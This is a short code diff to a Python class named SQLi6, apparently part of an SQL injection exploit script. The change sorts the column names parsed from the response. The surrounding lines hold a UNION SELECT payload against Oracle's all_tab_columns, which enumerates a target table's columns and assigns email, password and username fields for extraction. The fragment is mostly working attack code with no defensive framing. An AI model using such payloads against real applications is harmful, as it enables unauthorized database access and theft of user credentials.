@@ -44,7 +44,7 @@ class SQLi6:
     def get_columns(self):
         payload = f"'UNION SELECT column_name,'3670' FROM all_tab_columns where table_name='{self.table}'-- -"
         r = self.execute_request(payload)
-        self.columns = self.parse(r)
+        self.columns = sorted(self.parse(r))
         self.email, self.password_col, self.username_col = self.columns
         print(f"[*] columns: {self.columns}")
 
